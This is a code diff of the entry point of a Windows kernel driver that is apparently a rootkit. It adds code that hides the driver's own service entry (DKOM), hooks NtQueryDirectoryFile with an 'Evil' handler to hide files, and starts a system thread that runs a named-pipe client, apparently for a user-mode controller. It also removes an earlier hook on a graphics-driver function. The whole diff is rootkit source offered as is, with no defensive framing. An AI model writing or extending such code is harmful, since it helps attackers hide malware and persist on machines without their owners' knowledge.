@@ -1,20 +1,28 @@
-#include "hooking.h"
-
-
-typedef struct _DRIVER_ENTRY_PARAMS{
-    UINT_PTR MappedAddress{};
-    SIZE_T MappedSize{};
-}DRIVER_ENTRY_PARAMS, *PDRIVER_ENTRY_PARAMS;
+#include "piping.h"
+#include "DKOM.h"
+#pragma warning(disable : 4996)
 
 
 extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
-    UNREFERENCED_PARAMETER(DriverObject);
+    //UNREFERENCED_PARAMETER(DriverObject);
     UNREFERENCED_PARAMETER(RegistryPath);
-    if (!roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics")) {
+    DriverObject->DriverUnload = ShrootUnload;
+
+
+    // Hide KmdfDriver driver service:
+    if (!NT_SUCCESS(service::HideDriverService(DriverObject, NULL))) {
         return STATUS_UNSUCCESSFUL;
     }
-    
-    NTSTATUS status = STATUS_SUCCESS;
+
+
+    // Hook all file handling functions initially and save their original data:
+    if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", TRUE, 'HkQr'))) {
+        return STATUS_UNSUCCESSFUL;
+    }
+    //if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", TRUE, 'HkQx'))) {
+    //    return STATUS_UNSUCCESSFUL;
+    //}
+
     const char* HelloMessage =
         "\n----------\n"
         " _____   _   _  ______ _____  _____ _______   __ ____ _______\n"
@@ -27,6 +35,25 @@ extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING Re
         "\n----------\n";
 
     DbgPrintEx(0, 0, "%s", HelloMessage);
+
+
+    // Execute pipe client thread:
+    HANDLE PipeThread = NULL;
+    NTSTATUS status = PsCreateSystemThread(
+        &PipeThread,
+        GENERIC_ALL,
+        NULL,
+        NULL,
+        NULL,
+        (PKSTART_ROUTINE)PipeClient,
+        NULL);
+
+    if (!NT_SUCCESS(status))
+    {
+        DbgPrintEx(0, 0, "KMDFdriver - Failed to create client pipe thread, status code: 0x%x\n", status);
+        return STATUS_UNSUCCESSFUL;
+    }
+    ZwClose(PipeThread);
     return status;
 }
 
